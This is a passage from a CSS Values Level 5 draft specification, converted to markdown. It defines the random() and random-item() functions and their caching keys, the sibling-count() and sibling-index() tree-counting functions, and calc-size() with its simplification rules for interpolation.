<a id="ref-for-percentage-value①⑥"></a>

<a id="ref-for-determine-the-type-of-a-calculation"></a>

All of the [calculation](https://www.w3.org/TR/css-values-4/#calc-calculation) arguments can resolve to any [\<number\>](https://www.w3.org/TR/css-values-4/#number-value), [\<dimension\>](https://www.w3.org/TR/css-values-4/#typedef-dimension), or [\<percentage\>](https://www.w3.org/TR/css-values-4/#percentage-value), but must have the <em>same</em> [type](https://www.w3.org/TR/css-values-4/#determine-the-type-of-a-calculation), or else the function is invalid; the result will have the same type as the arguments.

<a id="ref-for-length-value⑧"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-d128ac17"></a> For example, random(50px, 100%, by 1em) is valid (assuming percentages are valid in the context this is used, and resolve to a [\<length\>](https://www.w3.org/TR/css-values-4/#length-value)), as all three arguments resolve to a length.
>
> However, random(50px, 180deg) is invalid, as lengths and angles are not the same type.

<a id="ref-for-funcdef-random⑧"></a>

<a id="ref-for-simplify-a-calculation-tree"></a>

<a id="ref-for-calc-calculation⑨"></a>

A [random()](#funcdef-random) function can be [simplified](https://www.w3.org/TR/css-values-4/#simplify-a-calculation-tree) as soon as its argument [calculations](https://www.w3.org/TR/css-values-4/#calc-calculation) can be simplified to numeric values.

<a id="ref-for-funcdef-random⑨"></a>

<a id="ref-for-computed-value①⑦"></a>

<a id="ref-for-calc-calculation①⓪"></a>

<a id="ref-for-used-value③"></a>

<a id="ref-for-percentage-value①⑦"></a>

<a id="ref-for-inheritance"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This means that [random()](#funcdef-random) is <em>usually</em> resolved by [computed value](https://www.w3.org/TR/css-cascade-5/#computed-value) time, and thus will inherit as a static numeric value. However, if the argument [calculations](https://www.w3.org/TR/css-values-4/#calc-calculation) aren’t resolved until [used value](https://www.w3.org/TR/css-cascade-5/#used-value) time (such as if they include [\<percentage\>](https://www.w3.org/TR/css-values-4/#percentage-value) values that require layout information to resolve), [inheritance](https://www.w3.org/TR/css-cascade-5/#inheritance) will transfer the <a id="ref-for-funcdef-random①⓪"></a>random() function itself. (This is no different, however, to the behavior of the <a id="ref-for-percentage-value①⑧"></a>\<percentage\>s themselves, which would inherit as <a id="ref-for-percentage-value①⑨"></a>\<percentage\>s and thus might resolve to different values on the child elements.)

<a id="ref-for-funcdef-random①①"></a>

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-2146881a"></a> At least in theory it should be fine to use [random()](#funcdef-random) in non-property contexts, so long as per-element isn’t specified; it’s well-defined what happens with `@media (max-width: random(100px, 500px)) {...}`, for example. I suspect we want to disallow it, tho?

#### <a id="random-infinities"></a>8.1.1.  Argument Ranges

In random(A, B, by C), if A or B is infinite, the result is NaN. If C is infinite, the result is A.

(If C is zero or negative, the result is A, but that falls out of the standard definition.)

<a id="ref-for-math-function⑧"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: As usual for [math functions](https://www.w3.org/TR/css-values-4/#math-function), if any argument calculation is NaN, the result is NaN.

<a id="ref-for-funcdef-random-item②"></a>

### <a id="random-item"></a>8.2.  Picking a Random Item From a List: the [random-item()](#funcdef-random-item) function

The <a id="funcdef-random-item"></a>random-item() function resolves to a random item from among its list of items.

<a id="ref-for-typedef-random-caching-options⑤"></a>

<a id="ref-for-comb-comma②④"></a>

<a id="ref-for-typedef-declaration-value①⑥"></a>

<a id="ref-for-mult-opt①④"></a>

<a id="ref-for-mult-comma④"></a>

```text
<random-item()> = random-item( <random-caching-options> , [ <declaration-value>? ]# )
```
<a id="ref-for-typedef-random-caching-options⑥"></a>

<a id="ref-for-funcdef-random①②"></a>

The <em>required</em> [\<random-caching-options\>](#typedef-random-caching-options) is interpreted identically to [random()](#funcdef-random). (See [§ 8.3 Generating/Caching Random Values: the \<random-caching-options\> value](#random-caching) for details.)

<a id="ref-for-funcdef-random①③"></a>

<a id="ref-for-typedef-dashed-ident②"></a>

<a id="ref-for-funcdef-random-item③"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Like [random()](#funcdef-random), the [\<dashed-ident\>](https://www.w3.org/TR/css-values-4/#typedef-dashed-ident) can be used to force similar [random-item()](#funcdef-random-item) functions to generate distinct random values, and per-element causes it to resolve to a distinct value on each element.
>
> <a id="ref-for-funcdef-random-item④"></a>
>
> Aside from these, the grouping of [random-item()](#funcdef-random-item) functions as "identical" is much simpler: all that matters is the number of arguments.
>
> <a id="ref-for-valdef-color-red"></a>
>
> <a id="ref-for-valdef-color-blue"></a>
>
> <a id="ref-for-valdef-color-green"></a>
>
> That is, random-item(--x, red, blue, green) and random-item(--x, 1, 2, 3) will always resolve to the same argument index: either [red](https://www.w3.org/TR/css-color-4/#valdef-color-red) and 1, or [blue](https://www.w3.org/TR/css-color-4/#valdef-color-blue) and 2, or [green](https://www.w3.org/TR/css-color-4/#valdef-color-green) and 3. This allows coordination between groups of properties that all want to use a random set of values.
>
> On the other hand, random-item(--x, red, blue, green) and random-item(--x, 1, 2, 3, 4) will have no connection to each other; any of the 12 possible combinations can occur.

<a id="ref-for-typedef-random-caching-options⑦"></a>

<a id="ref-for-funcdef-random-item⑤"></a>

<a id="ref-for-funcdef-random①④"></a>

<a id="ref-for-typedef-declaration-value①⑦"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The [\<random-caching-options\>](#typedef-random-caching-options) argument is required in [random-item()](#funcdef-random-item), but optional in [random()](#funcdef-random), both for parsing reasons (it’s impossible to tell whether random-item(--foo, --bar, --baz) has three [\<declaration-value\>](https://www.w3.org/TR/css-syntax-3/#typedef-declaration-value) arguments or two and a <a id="ref-for-typedef-random-caching-options⑧"></a>\<random-caching-options\> argument), and because accidentally associating the random generation of <a id="ref-for-funcdef-random-item⑥"></a>random-item() functions together is much easier to do accidentally, since only the number of arguments is used to distinguish instances.

<a id="ref-for-funcdef-random-item⑦"></a>

The remaining arguments are arbitrary sequences of CSS values. The [random-item()](#funcdef-random-item) function resolves to one of these sequences, chosen uniformly at random.

<a id="ref-for-funcdef-random-item⑧"></a>

<a id="ref-for-arbitrary-substitution-function④"></a>

<a id="ref-for-funcdef-var⑧"></a>

The [random-item()](#funcdef-random-item) function is an [arbitrary substitution function](#arbitrary-substitution-function), like [var()](https://www.w3.org/TR/css-variables-1/#funcdef-var).

<a id="ref-for-funcdef-random-item⑨"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> That is, if you use [random-item()](#funcdef-random-item):
>
> - <a id="ref-for-funcdef-random-item①⓪"></a>
>
>   <a id="ref-for-arbitrary-substitution-function⑤"></a>
>
>   So long as [random-item()](#funcdef-random-item) itself (and any other [arbitrary substitution functions](#arbitrary-substitution-function)) is syntactically valid, the entire property is assumed to be valid at parse time.
>
> - <a id="ref-for-funcdef-random-item①①"></a>
>
>   <a id="ref-for-computed-value①⑧"></a>
>
>   <a id="ref-for-substitute-a-var①"></a>
>
>   [random-item()](#funcdef-random-item) is substituted with whatever value it resolves to at [computed value](https://www.w3.org/TR/css-cascade-5/#computed-value) time when you’d [substitute a var()](https://www.w3.org/TR/css-variables-1/#substitute-a-var), so children all inherit the same resolved value.
>
> - <a id="ref-for-guaranteed-invalid-value⑦"></a>
>
>   If the substituted value ends up making the property invalid, the property’s value becomes the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value).

<a id="ref-for-arbitrary-substitution-function⑥"></a>

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-36f85add"></a> Define [arbitrary substitution function](#arbitrary-substitution-function), probably over in Variables, since we have several upcoming functions leaning on this functionality.

<a id="ref-for-funcdef-random-item①②"></a>

<a id="ref-for-funcdef-random①⑤"></a>

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-56846ba6"></a> Since [random-item()](#funcdef-random-item) is var()-like, we probably want to restrict it to only be usable in properties. (This is likely something we want to apply to all such functions.) Tho [random()](#funcdef-random) is a fundamentally different kind of value, we probably want to restrict it as well, for thematic consistency.

<a id="ref-for-typedef-random-caching-options⑨"></a>

### <a id="random-caching"></a>8.3.  Generating/Caching Random Values: the [\<random-caching-options\>](#typedef-random-caching-options) value

<a id="ref-for-sec-math.random"></a>

In a programming language like JavaScript, there’s a clear temporal ordering to code, so you can tell exactly <em>when</em> something like a call to <code><a href="https://tc39.es/ecma262/multipage/numbers-and-dates.html#sec-math.random">Math.random()</a></code> is evaluated. You can also store the results in a variable, making it clear when you’re reusing a single random value in multiple places, versus using a distinct random value in each location.

<a id="ref-for-funcdef-random①⑥"></a>

CSS, on the other hand, is a declarative language (code is not "executed" in any particular order, nor is there any control over how many times something is "executed"); it makes it very easy to apply identical styles to multiple elements but difficult to specify distinct values for each of them (making it unclear whether a property using [random()](#funcdef-random) is meant to resolve to the same value on each element it’s applied to or to distinct values on each); and it has very limited "variable" functionality (making it difficult to intentionally reuse a particular randomly-generated value in several places).

<a id="ref-for-funcdef-random①⑦"></a>

<a id="ref-for-funcdef-random-item①③"></a>

To resolve these issues, the [random()](#funcdef-random) and [random-item()](#funcdef-random-item) functions are defined to generate random values under the following caching semantics:

- <a id="ref-for-funcdef-random①⑧"></a>

  <a id="ref-for-funcdef-random-item①④"></a>

  <a id="ref-for-random-caching-key"></a>

  Each instance of [random()](#funcdef-random) or [random-item()](#funcdef-random-item) in a stylesheet specifies a <a id="random-caching-key"></a>random-caching key. Two instances of either function must resolve to <em>identical</em> values if their [random-caching keys](#random-caching-key) are identical; they must resolve to <em>distinct</em> values if they’re different.

  ("Distinct" here means generated by a fresh random operation; this might coincidentally result in the same value as another random operation.)

- <a id="ref-for-funcdef-random①⑨"></a>

  <a id="ref-for-random-caching-key①"></a>

  <a id="ref-for-tuple"></a>

  For [random()](#funcdef-random), the [random-caching key](#random-caching-key) is a [tuple](https://infra.spec.whatwg.org/#tuple) of:

  1.  <a id="ref-for-used-value④"></a>

      <a id="ref-for-calc-calculation①①"></a>

      The [used value](https://www.w3.org/TR/css-cascade-5/#used-value) of the minimum [calculation](https://www.w3.org/TR/css-values-4/#calc-calculation).

  2.  <a id="ref-for-used-value⑤"></a>

      <a id="ref-for-calc-calculation①②"></a>

      The [used value](https://www.w3.org/TR/css-cascade-5/#used-value) of the maximum [calculation](https://www.w3.org/TR/css-values-4/#calc-calculation).

  3.  <a id="ref-for-used-value⑥"></a>

      <a id="ref-for-calc-calculation①③"></a>

      The [used value](https://www.w3.org/TR/css-cascade-5/#used-value) of the step [calculation](https://www.w3.org/TR/css-values-4/#calc-calculation), if present, or null otherwise.

  4.  <a id="ref-for-typedef-dashed-ident③"></a>

      <a id="ref-for-typedef-random-caching-options①⓪"></a>

      The [\<dashed-ident\>](https://www.w3.org/TR/css-values-4/#typedef-dashed-ident) part of the [\<random-caching-options\>](#typedef-random-caching-options), if present, or null otherwise.

  5.  <a id="ref-for-typedef-random-caching-options①①"></a>

      If per-element is specified in the [\<random-caching-options\>](#typedef-random-caching-options), a unique value per element or pseudo-element the function appears in.

- <a id="ref-for-funcdef-random-item①⑤"></a>

  <a id="ref-for-random-caching-key②"></a>

  <a id="ref-for-tuple①"></a>

  For [random-item()](#funcdef-random-item), the [random-caching key](#random-caching-key) is a [tuple](https://infra.spec.whatwg.org/#tuple) of:

  1.  The number of arguments to the function.

  2.  <a id="ref-for-typedef-dashed-ident④"></a>

      <a id="ref-for-typedef-random-caching-options①②"></a>

      The [\<dashed-ident\>](https://www.w3.org/TR/css-values-4/#typedef-dashed-ident) part of the [\<random-caching-options\>](#typedef-random-caching-options), if present, or null otherwise.

  3.  <a id="ref-for-typedef-random-caching-options①③"></a>

      If per-element is specified in the [\<random-caching-options\>](#typedef-random-caching-options), a unique value per element or pseudo-element the function appears in.

<a id="ref-for-originating-element①"></a>

The "unique value per element or pseudo-element" must have the same lifetime as a JavaScript reference to the element (or to the [originating element](https://www.w3.org/TR/selectors-4/#originating-element) + sufficient additional info to uniquely identify the pseudo-element). Elements in separate documents (including across refreshes of the same page, which produces distinct documents with distinct elements) <em>should</em> have distinct unique values. (This is not strictly required, to allow for pseudo-random generation of these values, but uniqueness should be likely enough that authors cannot depend on elements having the same values across documents.)

Additionally, the random generation method <em>should</em> generate distinct values for the same operation when invoked on different documents (including refreshes of the same page).

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-c0f8e859"></a> For example, in the following stylesheet:
>
> ```text
> .random-square {
>   width: random(100px, 500px);
>   height: random(100px, 500px);
> }
> ```
>
> <a id="ref-for-random-caching-key③"></a>
>
> The [random-caching keys](#random-caching-key) for both functions are identical: `(100px, 500px, null, null, null)`. This means that both will resolve to the exact same value, guaranteeing a square element with a size somewhere between 100px and 500px. Additionally, <em>every</em> .random-square element will have the same size.
>
> On other hand, in this stylesheet:
>
> ```text
> .random-rect {
>   width: random(100px, 500px);
>   height: random(--x, 100px, 500px);
> }
> ```
>
> <a id="ref-for-random-caching-key④"></a>
>
> <a id="ref-for-propdef-width③"></a>
>
> <a id="ref-for-propdef-height"></a>
>
> The [random-caching keys](#random-caching-key) are distinct between the two functions: the function in [width](https://www.w3.org/TR/css-sizing-3/#propdef-width) has `(100px, 500px, null, null, null)`, while the function in [height](https://www.w3.org/TR/css-sizing-3/#propdef-height) has `(100px, 500px, null, --x, null)`.
>
> This means the two functions will resolve to distinct random values, making it very unlikely for the element to be square. However, every element matching .random-rect will still have the <em>same</em> random size.
>
> Changing any aspect of the function also alters this key. The following two declarations are similarly distinct, resulting in the width and height having no connection to each other:
>
> ```text
> .random-rect-2 {
>   width: random(100px, 500px);
>   height: random(100px, 500px, by 50px);
> }
> ```
>
> <a id="ref-for-used-value⑦"></a>
>
> But so long as the [used values](https://www.w3.org/TR/css-cascade-5/#used-value) end up identical, two functions that look distinct might end up identical. For example, in the following code:
>
> ```text
> .random-square-2 {
>   font-size: 16px;
>   width: random(160px, 320px);
>   height: random(10em, 20em);
> }
> ```
>
> <a id="ref-for-random-caching-key⑤"></a>
>
> The two functions superficially look different, but after the lengths are fully resolved they end up with identical [random-caching keys](#random-caching-key); each is `(160px, 320px, null, null, null)`, so actually the widths and heights will end up always identical.

<a id="ref-for-funcdef-random②⓪"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-113f656c"></a> By default, each instance of a [random()](#funcdef-random) function in a stylesheet essentially resolves to a static value, which is then shared by every element that property applies to. This behavior can be changed with the per-element keyword.
>
> For example, in:
>
> ```text
> .foo { width: random(100px, 500px); }
> ```
>
> Multiple elements matching .foo will end up with the same random width.
>
> But in:
>
> ```text
> .foo { width: random(per-element, 100px, 500px); }
> ```
>
> Every element matching .foo will get its own <em>unique</em> width.
>
> Note that this causes the value to be unique per element, not per <em>value</em> necessarily. For example, in:
>
> ```text
> .random-squares {
>   width: random(per-element, 100px, 500px);
>   height: random(per-element, 100px, 500px);
> }
> ```
>
> <a id="ref-for-propdef-width④"></a>
>
> <a id="ref-for-propdef-height①"></a>
>
> <a id="ref-for-random-caching-key⑥"></a>
>
> Every element matching .random-squares will get a distinct random value, but that value will be <em>the same</em> for [width](https://www.w3.org/TR/css-sizing-3/#propdef-width) and [height](https://www.w3.org/TR/css-sizing-3/#propdef-height) on a given element, making the element square. This is because in both properties the [random-caching key](#random-caching-key) is `(100px, 500px, null, null, [unique value for the element])`, so both functions will resolve to the same length on a single element.
>
> <a id="ref-for-custom-property③"></a>
>
> This makes random values in [custom properties](https://www.w3.org/TR/css-variables-1/#custom-property) act more predictably. The preceding code could also be written as:
>
> ```text
> .foo {
>   --size: random(per-element, 100px, 500px);
>   width: var(--size);
>   height: var(--size);
> }
> ```
<a id="ref-for-funcdef-sibling-count"></a>

<a id="ref-for-funcdef-sibling-index"></a>

## <a id="tree-counting"></a>9.  Tree Counting Functions: the [sibling-count()](#funcdef-sibling-count) and [sibling-index()](#funcdef-sibling-index) notations

<a id="ref-for-functional-notation⑨"></a>

<a id="ref-for-integer-value"></a>

<a id="ref-for-elements"></a>

The <a id="funcdef-sibling-count"></a>sibling-count() [functional notation](https://www.w3.org/TR/css-values-4/#functional-notation) represents, as an [\<integer\>](https://www.w3.org/TR/css-values-4/#integer-value), the total number of child [elements](https://www.w3.org/TR/css-display-3/#elements) in the parent of the element on which the notation is used.

<a id="ref-for-functional-notation①⓪"></a>

<a id="ref-for-integer-value①"></a>

<a id="ref-for-nth-child-pseudo"></a>

<a id="ref-for-funcdef-sibling-index①"></a>

The <a id="funcdef-sibling-index"></a>sibling-index() [functional notation](https://www.w3.org/TR/css-values-4/#functional-notation) represents, as an [\<integer\>](https://www.w3.org/TR/css-values-4/#integer-value), the index of the element on which the notation is used among the children of its parent. Like [:nth-child()](https://www.w3.org/TR/selectors-4/#nth-child-pseudo), [sibling-index()](#funcdef-sibling-index) is 1-indexed.

<a id="ref-for-funcdef-counter"></a>

<a id="ref-for-funcdef-sibling-index②"></a>

<a id="ref-for-string-value⑧"></a>

<a id="ref-for-integer-value②"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The [counter()](https://www.w3.org/TR/css-lists-3/#funcdef-counter) function can provide similar abilities as [sibling-index()](#funcdef-sibling-index), but returns a [\<string\>](https://www.w3.org/TR/css-values-4/#string-value) rather than an [\<integer\>](https://www.w3.org/TR/css-values-4/#integer-value).

<a id="ref-for-pseudo-element"></a>

<a id="ref-for-ultimate-originating-element"></a>

When used on a [pseudo-element](https://www.w3.org/TR/selectors-4/#pseudo-element), these both resolve as if specified on its [ultimate originating element](https://www.w3.org/TR/selectors-4/#ultimate-originating-element).

<a id="ref-for-selector"></a>

<a id="ref-for-funcdef-sibling-count①"></a>

<a id="ref-for-funcdef-sibling-index③"></a>

<a id="ref-for-flat-tree"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Like the rest of CSS (other than [selectors](https://www.w3.org/TR/selectors-4/#selector)), [sibling-count()](#funcdef-sibling-count) and [sibling-index()](#funcdef-sibling-index) operate on the [flat tree](https://drafts.csswg.org/css-scoping-1/#flat-tree).

<a id="ref-for-nth-child-pseudo①"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: These functions may, in the future, be extended to accept an of \<selector\> argument, similar to [:nth-child()](https://www.w3.org/TR/selectors-4/#nth-child-pseudo), to filter on a subset of the children.

<a id="ref-for-funcdef-calc-size"></a>

## <a id="calc-size"></a>10.  Calculating With Intrinsic Sizes: the [calc-size()](#funcdef-calc-size) function

<a id="ref-for-definite"></a>

<a id="ref-for-funcdef-calc④"></a>

When transitioning between two [definite](https://www.w3.org/TR/css-sizing-3/#definite) sizes, or slightly adjusting an existing definite size, [calc()](https://www.w3.org/TR/css-values-4/#funcdef-calc) works great: halfway between 100% and 20px is calc(50% + 10px), 20% with a margin of 15px on either side is calc(20% + 15px \* 2), etc.

<a id="ref-for-intrinsic-size"></a>

<a id="ref-for-funcdef-calc-size①"></a>

But these operations are no longer possible if the size you want to adjust or transition to/from is an [intrinsic size](https://www.w3.org/TR/css-sizing-3/#intrinsic-size), for both practical and backward-compatibility reasons. The [calc-size()](#funcdef-calc-size) function allows math to be performed on intrinsic sizes in a safe, well-defined way.

<a id="funcdef-calc-size"></a>

<a id="ref-for-typedef-calc-size-basis"></a>

<a id="ref-for-comb-comma②⑤"></a>

<a id="ref-for-typedef-calc-sum①⑧"></a>

<a id="typedef-calc-size-basis"></a>

<a id="ref-for-typedef-intrinsic-size-keyword"></a>

<a id="ref-for-comb-one①⓪③"></a>

<a id="ref-for-funcdef-calc-size②"></a>

<a id="ref-for-comb-one①⓪④"></a>

<a id="ref-for-comb-one①⓪⑤"></a>

<a id="ref-for-typedef-calc-sum①⑨"></a>

```text
<calc-size()> = calc-size( <calc-size-basis>, <calc-sum> )

<calc-size-basis> = [ <intrinsic-size-keyword> | <calc-size()> | any | <calc-sum> ]
```
<a id="ref-for-intrinsic-size①"></a>

<a id="ref-for-propdef-width⑤"></a>

<a id="ref-for-valdef-width-auto①"></a>

<a id="ref-for-valdef-width-min-content"></a>

<a id="ref-for-valdef-width-stretch"></a>

The <a id="typedef-intrinsic-size-keyword"></a>\<intrinsic-size-keyword\> production matches any [intrinsic size](https://www.w3.org/TR/css-sizing-3/#intrinsic-size) keywords allowed in the context. For example, in [width](https://www.w3.org/TR/css-sizing-3/#propdef-width), it matches [auto](https://www.w3.org/TR/css-sizing-3/#valdef-width-auto), [min-content](https://www.w3.org/TR/css-sizing-3/#valdef-width-min-content), [stretch](https://www.w3.org/TR/css-sizing-4/#valdef-width-stretch), etc.

<a id="ref-for-funcdef-calc-size③"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Why can [calc-size()](#funcdef-calc-size) be nested?
>
> <a id="ref-for-funcdef-calc-size④"></a>
>
> Allowing [calc-size()](#funcdef-calc-size) as the basis argument means that authors can use a variable as the basis (like calc-size(var(--foo), size + 20px)) and it will <em>always work</em> as long as the variable was originally valid for the property.
>
> <a id="ref-for-funcdef-calc⑤"></a>
>
> Doing the same with just [calc()](https://www.w3.org/TR/css-values-4/#funcdef-calc) doesn’t work - for example, if you have --foo: calc-size(min-content, size + 20px), or even just --foo: min-content, then calc( (var(--foo)) + 20px ) fails.
>
> The nesting is simplified away during interpolation, and at used-value time, so the basis always ends up as a simple value by the time interpolation and other effects occur; see [§ 10.1 Simplifying calc-size()](#simplifying-calc-size).

<a id="ref-for-typedef-calc-sum②⓪"></a>

<a id="ref-for-cssnumericvalue-type"></a>

<a id="ref-for-cssnumericvalue-match"></a>

<a id="ref-for-typedef-length-percentage①⑨"></a>

<a id="ref-for-length-value⑨"></a>

The first argument given is the <a id="calc-size-basis"></a>calc-size basis, and the second is the <a id="calc-size-calculation"></a>calc-size calculation. For either argument, if a [\<calc-sum\>](https://www.w3.org/TR/css-values-4/#typedef-calc-sum) is given, its [type](https://www.w3.org/TR/css-typed-om-1/#cssnumericvalue-type) must [match](https://www.w3.org/TR/css-typed-om-1/#cssnumericvalue-match) [\<length-percentage\>](https://www.w3.org/TR/css-values-4/#typedef-length-percentage), and it must resolve to a [\<length\>](https://www.w3.org/TR/css-values-4/#length-value).

<a id="ref-for-calc-size-calculation"></a>

<a id="ref-for-calc-size-basis"></a>

<a id="ref-for-valdef-calc-size-any"></a>

<a id="ref-for-length-value①⓪"></a>

<a id="ref-for-used-value⑧"></a>

Within the [calc-size calculation](#calc-size-calculation), if the [calc-size basis](#calc-size-basis) is not [any](#valdef-calc-size-any), the keyword <a id="valdef-calc-size-size"></a>size is allowed. This keyword is a [\<length\>](https://www.w3.org/TR/css-values-4/#length-value), and resolves at [used value](https://www.w3.org/TR/css-cascade-5/#used-value) time.

<a id="ref-for-funcdef-calc-size⑤"></a>

<a id="ref-for-intrinsic-size②"></a>

<a id="ref-for-length-value①①"></a>

[calc-size()](#funcdef-calc-size) represents an [intrinsic size](https://www.w3.org/TR/css-sizing-3/#intrinsic-size). It is specifically <em>not</em> a [\<length\>](https://www.w3.org/TR/css-values-4/#length-value); any place that wants to accept a <a id="ref-for-funcdef-calc-size⑥"></a>calc-size() must explicitly include it in its grammar.

<a id="ref-for-funcdef-calc⑥"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Why not just allow intrinsic keywords in [calc()](https://www.w3.org/TR/css-values-4/#funcdef-calc)?
>
> <a id="ref-for-funcdef-calc-size⑦"></a>
>
> In theory, rather than introducing [calc-size()](#funcdef-calc-size), we could have defined calc(auto \* .5) to be valid, allowing interpolation to work as normal.
>
> This has the minor issue that mixing keywords still wouldn’t be allowed, but it wouldn’t be as obvious (that is, calc((min-content + max-content)/2) looks reasonable, but would be disallowed).
>
> <a id="ref-for-definite①"></a>
>
> <a id="ref-for-valdef-width-auto②"></a>
>
> The larger issue, tho, is that this wouldn’t allow us to smoothly transition percentages. calc(50%) is only half the size of calc(100%) when percentages are [definite](https://www.w3.org/TR/css-sizing-3/#definite) in the context; if they’re not, the two values will usually be the same size (depending on the context, either 0px or [auto](https://www.w3.org/TR/css-sizing-3/#valdef-width-auto)-sized).
>
> Using a new function that explicitly separates the size you’re calculating with from the calculation itself lets us get smooth interpolation in <em>all</em> cases.
>
> <a id="ref-for-funcdef-calc⑦"></a>
>
> An additional consideration is that there are many effects, some small and some large, that depend on whether an element is intrinsically sized or definite. Using [calc()](https://www.w3.org/TR/css-values-4/#funcdef-calc) would mean that the answer to the question "is the element intrinsically-sized" can have one answer in the middle of a transition ("yes", for calc(min-content \* .2 + 20px \* .8))), but a different answer at the end of the transition ("no", for calc(20px)), causing the layout to jump at the end of an otherwise-smooth transition.
>
> <a id="ref-for-propdef-opacity"></a>
>
> (This is similar to the stacking-layer changes that can occur when animating from opacity:1 to [opacity: 0](https://www.w3.org/TR/css-color-4/#propdef-opacity); any non-1 value forces a stacking context. With <a id="ref-for-propdef-opacity①"></a>opacity you can get around this by animating to .999, which is visually indistinguishable from 1 but forces a stacking context. It’s not as reasonable to ask people to animate to calc(auto \* .0001) to ensure it retains its intrinsic-ness.)
>
> Again, using a new function that identifies itself as being <em>inherently</em> an intrinsic size, like calc-size(auto, 20px), means we can maintain stable layout behaviors the entire time, even when the actual size is a definite length.

<a id="ref-for-funcdef-calc-size⑧"></a>

### <a id="simplifying-calc-size"></a>10.1.  Simplifying [calc-size()](#funcdef-calc-size)

<a id="ref-for-math-function⑨"></a>

<a id="ref-for-specified-value①"></a>

<a id="ref-for-computed-value①⑨"></a>

<a id="ref-for-calc-size-calculation①"></a>

<a id="ref-for-calc-size-basis①"></a>

<a id="ref-for-typedef-calc-sum②①"></a>

Similar to [math functions](https://www.w3.org/TR/css-values-4/#math-function), at both [specified value](https://www.w3.org/TR/css-cascade-5/#specified-value) and [computed value](https://www.w3.org/TR/css-cascade-5/#computed-value) times the [calc-size calculation](#calc-size-calculation) (and the [calc-size basis](#calc-size-basis), if it’s a [\<calc-sum\>](https://www.w3.org/TR/css-values-4/#typedef-calc-sum)) are simplified to the extent possible, as defined in [CSS Values 4 § 10.10.1 Simplification](https://www.w3.org/TR/css-values-4/#calc-simplification).

<a id="ref-for-funcdef-calc-size⑨"></a>

To <a id="calc-size-canonicalize-for-interpolation"></a>canonicalize for interpolation a [calc-size()](#funcdef-calc-size) function:

<a id="ref-for-funcdef-calc-size①⓪"></a>

<a id="ref-for-calc-size-basis②"></a>

If the [calc-size basis](#calc-size-basis) is a [calc-size()](#funcdef-calc-size) function itself

<a id="ref-for-calc-size-basis③"></a>

<a id="ref-for-calc-size-calculation②"></a>

<a id="ref-for-substitute-into-a-calc-size-calculation"></a>

The [calc-size basis](#calc-size-basis) of the outer function is replaced with that of the inner function, and the inner function’s [calc-size calculation](#calc-size-calculation) is [substituted](#substitute-into-a-calc-size-calculation) into the outer function’s <a id="ref-for-calc-size-calculation③"></a>calc-size calculation.

<a id="ref-for-length-value①②"></a>

<a id="ref-for-cssnumericvalue-match①"></a>

<a id="ref-for-cssnumericvalue-type①"></a>

<a id="ref-for-typedef-calc-sum②②"></a>

<a id="ref-for-calc-size-basis④"></a>

Otherwise, if the [calc-size basis](#calc-size-basis) is a [\<calc-sum\>](https://www.w3.org/TR/css-values-4/#typedef-calc-sum) whose [type](https://www.w3.org/TR/css-typed-om-1/#cssnumericvalue-type) [matches](https://www.w3.org/TR/css-typed-om-1/#cssnumericvalue-match) [\<length\>](https://www.w3.org/TR/css-values-4/#length-value) (no percentage present)

<a id="ref-for-substitute-into-a-calc-size-calculation①"></a>

<a id="ref-for-calc-size-calculation④"></a>

Replace the basis with any, and the original basis is [substituted](#substitute-into-a-calc-size-calculation) into the [calc-size calculation](#calc-size-calculation).

<a id="ref-for-typedef-calc-sum②③"></a>

<a id="ref-for-calc-size-basis⑤"></a>

Otherwise, if the [calc-size basis](#calc-size-basis) is any other [\<calc-sum\>](https://www.w3.org/TR/css-values-4/#typedef-calc-sum) (contains a percentage)

<a id="ref-for-de-percentify-a-calc-size-calculation"></a>

<a id="ref-for-substitute-into-a-calc-size-calculation②"></a>

<a id="ref-for-calc-size-calculation⑤"></a>

Replace the basis with 100% and the original basis is [de-percentified](#de-percentify-a-calc-size-calculation), then [substituted](#substitute-into-a-calc-size-calculation) into the [calc-size calculation](#calc-size-calculation).

(The above is performed recursively, if necessary.)

<a id="ref-for-substitute-into-a-calc-size-calculation③"></a>

If any [substitute into a calc-size calculation](#substitute-into-a-calc-size-calculation) returns failure, the entire operation immediately returns failure.

<a id="ref-for-funcdef-calc-size①①"></a>

<a id="ref-for-calc-size-basis⑥"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: After canonicalization, a [calc-size()](#funcdef-calc-size) function will only have a [calc-size basis](#calc-size-basis) that’s a keyword, or the value 100%.

> <strong data-conversion-semantic="note">Note</strong>
>
> Why are percentages simplified in this way?
>
> This percentage simplification ensures that transitions work linearly.
>
> For example, say that 100% is 100px, for simplicity.
>
> If you transitioned from \`calc-size(100px, size \* 2)\` (resolves to 200px) to \`calc-size(50%, size - 20px)\` (resolves to 30px) by interpolating both the arguments, then at the halfway point you’d have \`calc-size(75px, size \* 2 \* .5 + (size - 20px) \* .5)\` (resolves to 102.5px), which is \*not\* halfway between 30 and 200 (that would be 115px). Interpolating one argument, then substituting it into another calculation and interpolating that one too, generally gives <em>quadratic</em> interpolation behavior.
>
> Instead, we substitute the basis arg into the calculation arg, so you get \`calc-size(percentage, 100px \* 2)\` and \`calc-size(percentage, (size \* .5) - 20px)\`, and when interpolated, at the halfway point you get \`calc-size(percentage, 100px \* 2 \* .5 + ((size \* .5) - 20px) \* .5)\`, which does indeed resolve to 115px, as expected. Other points in the transition are similarly linear.

To <a id="de-percentify-a-calc-size-calculation"></a>de-percentify a calc-size calculation <var>calc</var>:

1.  <a id="ref-for-typedef-percentage-token①"></a>

